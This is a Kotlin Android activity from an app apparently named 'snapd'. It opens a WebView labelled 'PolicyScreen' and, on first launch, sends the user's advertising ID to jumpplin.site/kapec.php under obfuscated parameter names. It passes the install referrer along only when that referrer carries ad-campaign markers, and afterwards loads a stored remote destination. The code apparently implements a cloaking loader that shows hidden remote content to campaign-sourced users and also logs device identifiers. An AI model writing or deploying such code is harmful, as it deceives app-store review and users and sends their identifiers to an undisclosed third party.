package com.snapd.presantation

import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebView
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.snapd.data.providers.NO_DATA
import com.snapd.data.storage.EMPTY_DESTINATION
import com.snapd.data.storage.SharedStorageImpl
import com.snapd.databinding.ActivityTresBinding
import com.snapd.domain.storage.AppStorage
import com.snapd.presantation.customUI.PolicyScreen

class TresActivity : AppCompatActivity() {

    private lateinit var binding: ActivityTresBinding
    private lateinit var applicationStorage: AppStorage
    private lateinit var policyScreen: PolicyScreen

    private var chooseCallback: ValueCallback<Array<Uri>>? = null
    private val getContent =
        registerForActivityResult(ActivityResultContracts.GetMultipleContents()) {
            chooseCallback?.onReceiveValue(it.toTypedArray())
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityTresBinding.inflate(layoutInflater)
        setContentView(binding.root)
        applicationStorage = SharedStorageImpl(this)

        policyScreen = PolicyScreen(this)
        policyScreen.initPolicyScreen(getContent = getContent)

        //insert web view
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(policyScreen, true)
        binding.root.addView(policyScreen)
        setBackClicks(policyScreen)


        if (applicationStorage.getDestination() == EMPTY_DESTINATION){
            val gaid = intent.getStringExtra(GAID) ?: NO_DATA
            val adb = intent.getStringExtra(ADB)
            val ref = intent.getStringExtra(REFERRER) ?: NO_DATA
            Log.d("123123", "gaid is $gaid, adb is $adb, ref is $ref")

            val mapToJoomboosick = mutableMapOf<String, String>()

            mapToJoomboosick.put("r0gv5ir6fk", gaid)

            if (ref.contains("cmpgn") || ref.contains("fb4a")) {
                mapToJoomboosick.put("7d1rv3tda1", ref)
            }

            policyScreen.loadUrl("https://jumpplin.site/kapec.php", mapToJoomboosick)

        } else {
            policyScreen.loadUrl(applicationStorage.getDestination())
        }
    }

    private fun setBackClicks(w: WebView) {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (w.canGoBack()) {
                    w.goBack()
                }
            }
        })
    }
}